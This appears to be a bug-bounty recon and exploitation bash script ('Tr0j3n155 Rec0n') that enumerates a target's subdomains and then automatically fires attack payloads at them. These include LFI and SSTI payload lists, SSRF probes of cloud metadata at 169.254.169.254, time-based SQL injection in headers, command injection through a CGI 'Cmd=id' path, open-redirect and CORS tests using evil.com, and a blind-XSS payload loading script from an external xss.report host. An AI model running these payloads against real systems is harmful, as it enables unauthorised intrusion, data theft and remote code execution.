#!/bin/bash


# ========== BANNER ========== #
echo -e "${YELLOW}"
echo "████████╗██████╗  ██████╗      ██████╗  ██████╗ ███╗   ██╗"
echo "╚══██╔══╝██╔══██╗██╔═══██╗    ████████╗██╔═══██╗████╗  ██║"
echo "   ██║   ██████╔╝██║   ██║    ╚██╔═██╔╝██║   ██║██╔██╗ ██║"
echo "   ██║   ██╔═══╝ ██║   ██║    ██████╔╝ ██║   ██║██║╚██╗██║"
echo "   ██║   ██║     ╚██████╔╝    ╚═██╔═╝  ╚██████╔╝██║ ╚████║"
echo "   ╚═╝   ╚═╝      ╚═════╝        ╚═╝     ╚═════╝ ╚═╝  ╚═══╝"
echo "         Tr0j3n155 Rec0n | Automated Recon Framework"
echo -e "${RESET}"

# ========== Colors & Symbols ========== #
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
CYAN="\033[1;36m"
RESET="\033[0m"
CHECK="\xE2\x9C\x94"
WARN="\xE2\x9A\xA0"
INFO="\xF0\x9F\x93\x8A"


# ========== Basic Config ========== #
echo -e "${BLUE}[*] Initializing recon for: ${YELLOW}$1${RESET}"
target="$1"
if [[ -z "$target" ]]; then
  echo -e "${RED}[!] Usage: $0 [target-folder-name]${RESET}"
  exit 1
fi

base_dir="/home/tr0j3n/BugBounty/$target"
dlsubs="$base_dir/dlsubs"
passive_dir="$base_dir/passive_enum"
active_dir="$base_dir/active_enum"
output_dir="$base_dir/probing"
scan_dir="$base_dir/scan"
gf_dir="$scan_dir/gf"

wordlist="/home/tr0j3n/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt"
resolvers="/home/tr0j3n/resolvers.txt"
namelist="/home/tr0j3n/tools/SecLists/Discovery/DNS/namelist.txt"
payloads_ssi="/home/tr0j3n/tools/SecLists/Fuzzing/SSI-Injection-Jhaddix.txt"
payloads_lfi="/home/tr0j3n/tools/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
server_ip="tr0j3n.requestcatcher.com"

mkdir -p "$passive_dir" "$active_dir" "$output_dir" "$scan_dir" "$gf_dir"

# ========== Check ========== #
if [[ ! -f "$dlsubs" ]]; then
  echo -e "${RED}[!] dlsubs not found at: $dlsubs${RESET}"
  exit 1
fi

# ========== Passive Recon ========== #

echo -e "${CYAN}${INFO} Passive Recon...${RESET}"
> "$passive_dir/all.txt"
while read -r domain; do
  subfinder -d "$domain" -silent >> "$passive_dir/subfinder.txt"
  assetfinder --subs-only "$domain" >> "$passive_dir/assetfinder.txt"
  resp=$(curl -s "https://crt.sh/?q=%25.$domain&output=json")
echo "$resp" | jq empty 2>/dev/null && echo "$resp" | jq -r '.[].name_value' | sed 's/\*\.//g' >> "$passive_dir/crtsh.txt"
  curl -s "https://jldc.me/anubis/subdomains/$domain" | jq -r '.[]' >> "$passive_dir/anubis.txt"
  curl -s "https://urlscan.io/api/v1/search/?q=domain:$domain" | jq -r '.results[].page.domain' | grep -E ".*\.$domain$" >> "$passive_dir/urlscan.txt"
  curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/passive_dns" | jq -r '.passive_dns[].hostname' | grep -E ".*\.$domain$" >> "$passive_dir/otx.txt"
  waybackurls "$domain" | awk -F/ '{print $3}' | grep -E ".*\.$domain$" >> "$passive_dir/wayback.txt"
done < "$dlsubs"

# ========== Active Recon ========== #
echo -e "${CYAN}${INFO} Active Recon...${RESET}"

> "$active_dir/puredns.txt"
while read -r domain; do
  puredns bruteforce "$wordlist" "$domain" -r "$resolvers" >> "$active_dir/puredns.txt"
done < "$dlsubs"

# ========== Gotator Expansion ========== #
echo -e "${CYAN}${INFO} Expanding with Gotator...${RESET}"

cat "$passive_dir"/*.txt "$active_dir/puredns.txt" | sort -u > "$base_dir/sub"
#gotator -sub "$base_dir/sub" -perm "$namelist" -depth 1 -numbers 10 -mindup -adv -md > "$base_dir/gotator.txt"#
cat "$base_dir/sub" #"$base_dir/gotator.txt"# | sort -u > "$base_dir/sub_final.txt"

# ========== Probing ========== #
echo -e "${CYAN}${INFO} Probing Live Hosts...${RESET}"

cat "$base_dir/sub_final.txt" | httpx -silent -timeout 10 > "$base_dir/subs"
cat "$base_dir/subs" | httpx -ss 
sed 's#^https://##' "$base_dir/subs" > "$base_dir/sub2"
sed 's#^http://##' "$base_dir/sub2" > "$base_dir/sub3"
rm $base_dir/sub2

# ========== Shodan Intelligence ========== #
echo -e "${CYAN}${INFO} Gathering Shodan Intelligence on IPs...${RESET}"
cat "$base_dir/subs" | dnsx -a -silent | awk '{print $2}' | sort -u > "$scan_dir/ips.txt"
mkdir -p "$scan_dir/shodan"
while read -r ip; do
  echo -e "${BLUE}[Shodan] Scanning IP: $ip${RESET}"
  shodan host "$ip" --timeout 5 > "$scan_dir/shodan/$ip.txt"
done < "$scan_dir/ips.txt"

grep -riE "Apache|nginx|FTP|Telnet|RDP|CVE|VNC" "$scan_dir/shodan" > "$scan_dir/shodan/findings.txt"

for file in "$scan_dir/shodan/"*; do
  grep -E "IP:|Org:|OS:|CVE" "$file" >> "$scan_dir/shodan/summary.txt"
done


# ========== Port Scanning ========== #
echo -e "${CYAN}${INFO} Starting Port Scan...${RESET}"
naabu -list "$base_dir/sub3" -top-ports 1000 -o "$scan_dir/ports.txt"

# ========== DNSx, TLS, CSP, Cloudflare ========== #

echo -e "${CYAN}${INFO} DNS, TLS & Cloudflare Checks...${RESET}"

cat "$base_dir/subs" | dnsx -silent -cname -resp > "$scan_dir/dnsx_cname"
tlsx -l "$base_dir/subs" -expired -self-signed -mismatched -revoked -untrusted > "$scan_dir/tls_misc"
cat "$base_dir/subs" | tlsx -tls-version -cipher > "$scan_dir/tls_cipher"
cat "$base_dir/subs" | httpx -csp-probe -status-code -retries 2 -no-color | anew "$scan_dir/csp_probed.txt" | cut -d ' ' -f1 | unfurl -u domains | anew -q "$scan_dir/csp_subdomains.txt"
cat "$base_dir/subs" | cf-check -d > "$scan_dir/cloudflare-check"

# ========== Wayback + Gospider ========== #

echo -e "${CYAN}${INFO} Crawling with Gospider...${RESET}"

cat "$base_dir/subs" | waybackurls > "$base_dir/urls"
gospider -S "$base_dir/urls" --js -t 50 -d 3 --sitemap --robots -w -r > "$base_dir/gospider.txt"
sed -i '/^.{2048}./d' "$base_dir/gospider.txt"

while IFS= read -r domain; do
  grep -Eo 'https?://[^ ]+' "$base_dir/gospider.txt" | sed 's/]$//' | unfurl -u domains | grep "$domain$" | sort -u >> "$base_dir/scrap_subs.txt"
done < "$dlsubs"

puredns resolve "$base_dir/scrap_subs.txt" -w "$base_dir/scrap_subs_resolved.txt" -r "$resolvers"

# ========== Analytics & File Filters ========== #

echo -e "${CYAN}${INFO} Analyzing URLs & Extracting Files...${RESET}"

cat "$base_dir/subs" | /home/tr0j3n/tools/AnalyticsRelationships/analyticsrelationships > "$base_dir/analytic"
cat "$base_dir/subs" "$base_dir/urls" | grep .php | sort -u > "$base_dir/phpfile"
cat "$base_dir/subs" "$base_dir/urls" | grep .js | sort -u > "$base_dir/jsfile"
cat "$base_dir/subs" "$base_dir/urls" | grep admin | sort -u > "$base_dir/adminfile"
cat "$base_dir/subs" "$base_dir/urls" | grep api | sort -u > "$base_dir/apifile"



# ========== GF Pattern Extraction & Fuzzing ========== #
cat "$base_dir/urls" | gf xss | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | qsreplace "FUZZ" | tee "$gf_dir/xss" &> /dev/null
cat "$base_dir/urls" | gf lfi | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | tee "$gf_dir/lfi" &> /dev/null
cat "$base_dir/urls" | gf ssrf | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | tee "$gf_dir/ssrf" &> /dev/null
cat "$base_dir/urls" | gf ssti | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | tee "$gf_dir/ssti" &> /dev/null
cat "$base_dir/urls" | gf sqli | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | tee "$gf_dir/sqli" &> /dev/null
cat "$base_dir/urls" | gf redirect | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" | tee "$gf_dir/redirect" &> /dev/null

cat "$payloads_ssi" | while read -r line; do cat "$gf_dir/ssti" | qsreplace "$line" | tee "$gf_dir/checkSSTI.txt"; done 2> /dev/null
cat "$payloads_lfi" | while read -r line; do cat "$gf_dir/lfi" | qsreplace "$line" | tee "$gf_dir/checkLFI.txt"; done 2> /dev/null
cat "$gf_dir/ssrf" | qsreplace "$server_ip" | tee "$gf_dir/checkSSRF.txt"
cat "$base_dir/urls" | cut -d"?" -f1 | cut -d"=" -f1 | tee "$gf_dir/checkSensitive.txt"
cat "$gf_dir/redirect" | qsreplace "FUZZ" | tee "$gf_dir/checkRedirect.txt"
cat "$gf_dir/sqli" | qsreplace "FUZZ" | tee "$gf_dir/checkSQLI.txt"


# ========== JS File Analysis (LinkFinder) ========== #

echo -e "${CYAN}${INFO} Extracting JS Endpoints...${RESET}"

mkdir -p "$scan_dir/js_analysis"
cat "$base_dir/jsfile" | while read -r jsurl; do
  echo "[+] Analyzing JS file for endpoints: $jsurl"
  python3 /home/tr0j3n/tools/LinkFinder/linkfinder.py -i "$jsurl" -o cli >> "$scan_dir/js_analysis/js_endpoints.txt"
done

# ========== JS Secret Detection (truffleHog) ========== #

echo -e "${CYAN}${INFO} Checking JS Secrets...${RESET}"

mkdir -p "$scan_dir/secrets"
cat "$base_dir/jsfile" | while read -r jsurl; do
  echo "[+] Checking for secrets in: $jsurl"
  curl -s "$jsurl" -o "$scan_dir/secrets/temp.js"
  trufflehog filesystem "$scan_dir/secrets/temp.js" --regex --entropy=False --json >> "$scan_dir/secrets/trufflehog_results.json"
done

# ========== Vulnerability Checks ========== #

echo -e "${CYAN}${INFO} Running Vulnerability Checks...${RESET}"

sed 's/$/?__proto__[testparam]=exploit/' "$base_dir/subs" | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' 2> /dev/null | sed "s/[()]/ /g" | sed "s/JS //g" | grep "VULNERABLE" | tee "$scan_dir/proto.txt" &> /dev/null

cat "$gf_dir/checkSSTI.txt" | xargs -P 100 -I % bash -c "curl -s -L '%' | grep 'check-ssti49' && echo '[VULNERABLE] - %'" | grep "VULNERABLE" | tee "$scan_dir/ssti.txt" &> /dev/null

cat "$gf_dir/checkLFI.txt" | xargs -P 100 -I % bash -c "curl -s -L '%' | grep 'root:' && echo '[VULNERABLE] - %'" | grep "VULNERABLE" | tee "$scan_dir/lfi.txt" &> /dev/null

cat "$base_dir/urls" | sed "s/[()']//g" | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -P 50 -I % bash -c "curl -ks '%' | grep 'compute.internal' && echo '[VULNERABLE] - %'" | grep "VULNERABLE" | tee "$scan_dir/ssrf.txt" &> /dev/null

ffuf -w "$gf_dir/checkSSRF.txt" -u "FUZZ" -p "0.6-1.2" -H "User-Agent: Mozilla/5.0" -t 50 -s | tee "$scan_dir/ssrf_fuff" &> /dev/null

cat "$gf_dir/checkSensitive.txt" | grep -Ei '\.(zip|tar\.gz|sql|env|log|db|bak|key|ini)$' | tee "$scan_dir/sensitive"

cat "$gf_dir/redirect" | grep -ai "=http" | qsreplace "http://www.evil.com/" | xargs -P 50 -I % bash -c "curl -s -L '%' -I | grep 'evil.com' && echo '[VULNERABLE] - %'" | grep "VULNERABLE" | tee "$scan_dir/redirect.txt" &> /dev/null

cat "$gf_dir/xss" | qsreplace "\"><img src=x onerror=confirm(document.domain)>" | xargs -P 50 -I % bash -c "curl -s -L '%' | grep '<img src=x onerror=confirm(document.domain)>' && echo '[VULNERABLE] - %'" | grep "VULNERABLE" | tee "$scan_dir/xss.txt" &> /dev/null

cat "$gf_dir/xss" | xargs -P 30 -I % bash -c 'echo "%" | kxss' | anew -q "$scan_dir/kxss.txt" &> /dev/null

cat "$gf_dir/sqli" | qsreplace "'\"" | xargs -P 50 -I % bash -c "curl -s -L '%' | grep 'You have an error in your SQL syntax' && echo '[VULNERABLE] - %'" | grep "VULNERABLE" | tee "$scan_dir/sqli.txt" &> /dev/null

cat "$gf_dir/lfi.txt" | awk -F "/" '{print $1}' | sed 's/\[VULNERABLE\] - //g' | sort -u | tee "$scan_dir/lfi-directory.txt"
cat "$gf_dir/sensitive" | awk -F "/" '{print $1}' | sed 's/\[VULNERABLE\] - //g' | sort -u | tee "$scan_dir/info.txt"
cat "$gf_dir/redirect.txt" | awk -F "?" '{print $1}' | sed 's/\[VULNERABLE\] - //g' | sort -u | tee "$scan_dir/open-redirect.txt"

cat "$base_dir/subs" | httpx -silent -H "X-Forwarded-For:'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'

cat "$base_dir/subs" | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")" | tee "$base_dir/getjs_result"

cat "$base_dir/subs" | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent | tee "$scan_dir/rce"

cat "$base_dir/subs" | bxss -payload 'javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/tr0j3n155\';document.body.appendChild(a)')' -header "X-Forwarded-For" | tee "$scan_dir/bxss"


# ========== Subdomain Takeover Check ========== #
echo -e "${CYAN}${INFO} Running Subdomain Takeover Scan...${RESET}"
subjack -w $base_dir/subs -t 100 -timeout 30 -ssl -v -c ~/fingerprints.json -o $base_dir/takeover_results.txt

# ========== CORS Misconfiguration Check ========== #
echo -e "${CYAN}${INFO} Checking for CORS Misconfigs...${RESET}"
for i in $(cat $base_dir/subs); do
  if curl -sIH "Origin: https://evil.com" -X GET "$i" | grep -q 'https://evil.com'; then
    echo "[Potential CORS Found] $i"
  else
    echo "Nothing on $i" 
  fi
done | tee $base_dir/scan/cors

for url in $(cat $base_dir/subs); do curl -s -I "$url" | grep -i 'access-control-allow-origin' >> $scan_dir/cors_access_allow; done

python3 /home/tr0j3n/tools/CORStest/corstest.py $base_dir/subs | tee $scan_dir/cors_test
# ========== Done ========== #

echo -e "${GREEN}${CHECK} Recon Complete — All results saved in: $base_dir${RESET}"
